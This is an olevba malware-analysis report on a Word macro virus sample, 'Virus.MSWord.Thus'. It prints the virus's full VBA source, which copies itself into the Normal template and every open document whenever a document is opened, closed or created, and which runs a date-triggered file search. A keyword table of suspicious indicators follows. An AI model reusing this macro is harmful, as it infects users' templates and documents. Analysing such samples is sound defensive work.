olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.di
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.di - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub Document_Open()
'Thus_001'
    'On Error Resume Next
    'Application.Options.VirusProtection = False
    'Set prevDocument = ActiveDocument
    'Set nextDocument = NormalTemplate
    '.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
    'End If
    
    If NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines = 0 Then
    NormalTemplate.VBProject.VBComponents.Item(1).codemodule _
    .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
    .codemodule.Lines(1, ActiveDocument.VBProject.VBComponents _
    .Item(1).codemodule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
   If Application.Documents.Item(k).VBProject.VBComponents.Item(1).codemodule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .codemodule.deletelines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).codemodule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).codemodule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .codemodule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).codemodule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).codemodule.CountOfLines)
    End If
    Next k
    If (Day(Now()) = 13) And (Month(Now()) = 12) Then
    With Application.FileSearch
        .NewSearch
        .LookIn = "C:\"
        .SearchSubFolders = True
        .FileName = "*.*"
        .MatchTextExactly = False
        .FileType = msoFileTypeAllFiles
        If .Execute > 0 Then
        For I = 1 To .FoundFiles.Count
       Next I
        End If
    End With
    End If
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub


























































































Private Sub SpinButton1_Change()

End Sub








































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |SpinButton1_Change  |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

